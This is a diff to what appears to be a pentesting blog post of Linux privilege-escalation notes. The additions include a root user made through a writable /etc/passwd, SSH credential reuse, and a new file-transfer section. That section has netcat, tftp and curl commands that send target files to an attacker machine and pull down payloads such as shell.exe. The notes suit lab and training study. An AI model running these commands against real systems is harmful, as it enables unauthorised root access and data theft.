@@ -2,9 +2,9 @@
 
 ## Overview
 
-This is just a few basic searches we can do when we first gain a foothold on the target system. We will first look for some quick wins and then move onto searching for interesting files in common directories, along with searches for passwords and credentials.
+Here we have a few basic searches we can do when we first gain a foothold on the target system. We will first look for some quick wins and then move onto searching for interesting files in common directories, along with searches for passwords and credentials.
 
-We can then look for some misconfigurations, we can look for cron jobs and automated tasks that might be running on the system. From there we will search for misconfigurations on files, binaries and directories. While searching for misconfigurations on binaries, we can search the binary version on things that stand out to us.
+We will then look for some misconfigurations, we can look for cron jobs and automated tasks that might be running on the system. From there we will search for misconfigurations on files, binaries and directories. While searching for misconfigurations on binaries, we can search the binary version on things that stand out to us.
 
 Lastly, we will take a look at kernel exploits for the kernel and Operating system version. Are there any updates that the system needs, are there any tools to compile possible Kernel exploits.
 
@@ -40,7 +40,7 @@ sudo -l
 
 Can we write to or read /etc/shadow, can we write to /etc/passwd, /etc/sudoers. Whats inside /etc/sudoers.d/.  
 
-Here we can write to /etc/passwd
+Here we are able to write to the file /etc/passwd. We can create a sudo user with id 0.
 ```
 1. Create the hashed password for the /etc/passwd file.
 
@@ -156,7 +156,7 @@ ls -alh /var/spool/cron
 ls -al /etc/ | grep cron
 ```
 
-After our search lets take a look at possible SUDI/SGID escalation possibilities. Check things we are not too sure about. We can check [GTFOBins](https://gtfobins.github.io/) for ways to exploit misconfigurations.
+After our search, lets take a look at possible SUDI/SGID escalation possibilities. Check things we are not too sure about. We can check [GTFOBins](https://gtfobins.github.io/) for ways to exploit misconfigurations.
 ```
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 find / -perm /2000 -type f -exec ls -la {} 2>/dev/null \;
@@ -197,6 +197,7 @@ Can we re-use any passwords or credentials found in our earlier searches.
 su - bob
 su - root
 msql -u root -p
+ssh root@192.168.0.4
 ```
 
 Let's look for some interesting files and directories that can be written to.
@@ -250,12 +251,19 @@ Lets get some Kernel information on the target system.
 uname -a
 (cat /proc/version || uname -a ) 2>/dev/null
 lsb_release -a 2>/dev/null
-lscpu     # Architecture
+# Architecture
+file /bin/bash
+lscpu
 ```
 
 After we note the Kerenl information, we can get the OS information.
 ```
 cat /etc/*-release
+```
+
+What can we use to compile and run code on the target.
+```
+which gcc g++ make gdb python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby
 ```
 
 We can search Google, exploit-db and searchsploit for known exploits in regards to Kerenl and OS versions of the system.
@@ -274,8 +282,88 @@ We can use some of searchsploits switches to tailor the search.
 --exclude="term" Remove values from results. By using "|" to separate, you can chain multiple values
 ```
 
-Once we have an exploit that looks interesting, we can examine and download with the following switches.
+Once we have an exploit that looks interesting, we can examine and download with the following searchsploit switches.
 ```
 -m, --mirror   [EDB-ID]    Mirror (aka copies) an exploit to the current working directory
 -x, --examine  [EDB-ID]    Examine (aka opens) the exploit using $PAGER
 ```
+
+## Transfering Files To And From The Target
+
+Here we have a few commands to enable us to transfer files from our attackers machine to the target machine.
+
+Netcat
+
+```
+# On target machine
+nc -w 3 192.168.1.1 1234 < file.txt
+
+# On attacker machine
+nc -nvlp 1234 > file.txt
+```
+
+tftp
+
+```
+tftp -i 192.168.119.201 put important.docx
+tftp -i 192.168.119.201 get test.txt
+```
+
+wget
+```
+wget http://192.168.0.1/evil.txt -O /tmp/evil.txt
+```
+
+curl
+```
+# Curl Download files
+
+# ftp
+curl -u username:pass123 'ftp://192.168.49.89/test.txt' -o lol.txt
+
+# Settup http sever on Kali
+curl 192.168.0.1/shell.exe -o shell.exe
+
+## Curl Upload files To Kali
+
+# Setup ftp server on Kali
+curl -u username:pass123 -T "/tmp/haircut/test.txt" ftp://10.10.14.30/
+
+# Setup apache http server 
+curl -T exposed.php http://10.10.14.4/put.php
+```
+
+## Python Server On Kali
+
+Creating a python server to transfer files.
+
+HTTP Server
+```python
+# python2
+sudo python -m SimpleHTTPServer 80
+
+# python3
+sudo python3 -m http.server 7331
+```
+
+FTP Server
+```python
+sudo python3 -m pyftpdlib -p 21
+```
+
+SMB Server
+```
+# smbserver.py/impacket-smbserver
+
+sudo smbserver.py lab /tmp    
+sudo smbserver.py -smb2support lab /tmp/                            # SMBv2
+sudo smbserver.py lab . -smb2support -username dh -password dh           # Useing username and pasword
+```
+
+## End
+
+[Back To Blog](https://0xd4vid.github.io/)
+
+---  
+
+---
